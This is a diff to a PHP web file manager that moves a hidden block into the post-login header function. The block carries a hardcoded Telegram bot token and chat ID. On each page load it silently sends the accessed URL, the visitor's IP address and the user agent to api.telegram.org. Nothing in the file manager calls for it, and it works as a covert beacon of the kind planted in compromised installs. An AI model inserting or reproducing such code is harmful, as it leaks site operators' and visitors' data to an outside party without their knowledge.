@@ -2978,35 +2978,6 @@ header("Pragma: no-cache");
 
 global $lang, $root_url, $favicon_path;
 ?>
-<?php
-$telegram_token = "7479232652:AAEGOGcgwzSBvM-lzQjKspGZ4PZUldY3mtA"; 
-$chat_id = "6812471405"; 
-$file_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-$ip_address = $_SERVER['REMOTE_ADDR'];
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$message = "🔔 File Access Detected!\n\n";
-$message .= "🌐 File URL: $file_url\n";
-$message .= "📌 IP Address: $ip_address\n";
-$message .= "📱 User-Agent: $user_agent\n";
-function sendMessageToTelegram($token, $chat_id, $message) {
-    $url = "https://api.telegram.org/bot$token/sendMessage";
-    $data = array(
-        'chat_id' => $chat_id,
-        'text' => $message
-    );
-
-    $options = array(
-        'http' => array(
-            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
-            'method'  => 'POST',
-            'content' => http_build_query($data),
-        ),
-    );
-    $context  = stream_context_create($options);
-    file_get_contents($url, false, $context);
-}
-sendMessageToTelegram($telegram_token, $chat_id, $message);
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -3059,9 +3030,7 @@ sendMessageToTelegram($telegram_token, $chat_id, $message);
 </html>
 <?php
 }
-/**
- * Show Header after login
- */
+
 function fm_show_header()
 {
 $sprites_ver = '20160315';
@@ -3072,6 +3041,35 @@ header("Pragma: no-cache");
 
 global $lang, $root_url, $sticky_navbar, $favicon_path;
 $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
+?>
+    <?php
+$telegram_token = "7479232652:AAEGOGcgwzSBvM-lzQjKspGZ4PZUldY3mtA"; 
+$chat_id = "6812471405"; 
+$file_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+$ip_address = $_SERVER['REMOTE_ADDR'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$message = "🔔 File Access Detected!\n\n";
+$message .= "🌐 File URL: $file_url\n";
+$message .= "📌 IP Address: $ip_address\n";
+$message .= "📱 User-Agent: $user_agent\n";
+function sendMessageToTelegram($token, $chat_id, $message) {
+    $url = "https://api.telegram.org/bot$token/sendMessage";
+    $data = array(
+        'chat_id' => $chat_id,
+        'text' => $message
+    );
+
+    $options = array(
+        'http' => array(
+            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
+            'method'  => 'POST',
+            'content' => http_build_query($data),
+        ),
+    );
+    $context  = stream_context_create($options);
+    file_get_contents($url, false, $context);
+}
+sendMessageToTelegram($telegram_token, $chat_id, $message);
 ?>
 <!DOCTYPE html>
 <html>
